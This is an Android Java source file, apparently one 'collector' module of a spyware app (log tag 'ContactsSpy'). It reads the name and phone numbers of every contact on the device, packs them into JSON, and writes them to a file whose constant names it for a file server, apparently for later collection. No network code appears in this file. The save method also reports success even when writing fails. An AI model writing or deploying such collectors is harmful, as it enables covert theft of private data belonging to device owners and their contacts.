package com.tangledbytes.sw.collectors;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.tangledbytes.sw.utils.Constants;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileWriter;
import java.io.IOException;

public class ContactsCollector extends Collector {
    private final String TAG = "ContactsSpy";
    public static final String CONTACTS_FILE_NAME = "contacts.json";
    private final JSONArray contacts = new JSONArray();
    private Context mContext;

    public ContactsCollector(Context context) {
        mContext = context;
    }

    @SuppressLint("Range")
    @Override
    public void collect() {
        ContentResolver contentResolver = mContext.getContentResolver();
        Cursor contCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((contCursor != null ? contCursor.getCount() : 0) > 0) {
            while (contCursor.moveToNext()) {
                // Load Contact
                @SuppressLint("Range") String contactID = contCursor
                        .getString(contCursor.getColumnIndex(ContactsContract.Contacts._ID));
                @SuppressLint("Range") String contactName = contCursor
                        .getString(contCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (contCursor.getInt(contCursor.getColumnIndex(ContactsContract
                        .Contacts.HAS_PHONE_NUMBER)) > 0) {
                    // Load Contact Phone Numbers
                    Cursor pNumsCursor = contentResolver
                            .query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{contactID}, null);
                    try {
                        JSONArray pNumbers = new JSONArray();
                        while (pNumsCursor.moveToNext()) {
                            String strPNumber = pNumsCursor
                                    .getString(pNumsCursor.getColumnIndex(ContactsContract
                                            .CommonDataKinds.Phone.NUMBER));
                            pNumbers.put(strPNumber);
                        }
                        pNumsCursor.close();

                        // Add loaded contact to JSON objects
                        JSONObject contact = new JSONObject();
                        contact.put("Name", contactName);
                        contact.put("Phone Numbers", pNumbers);
                        contacts.put(contact);
                    } catch(JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        }
        if(contCursor != null)
            contCursor.close();

        // Save contacts
        if(!saveContacts())
            Log.e(TAG, "Unable to save contacts, dest file");
    }

    private boolean saveContacts() {
        try {
            FileWriter fw = new FileWriter(Constants.FILE_SERVER_CONTACTS);
            fw.write(contacts.toString());
            fw.close();
        } catch(IOException e) {
            Log.e(TAG, "Error occurred while saving contacts", e);
        }
        return true;
    }
}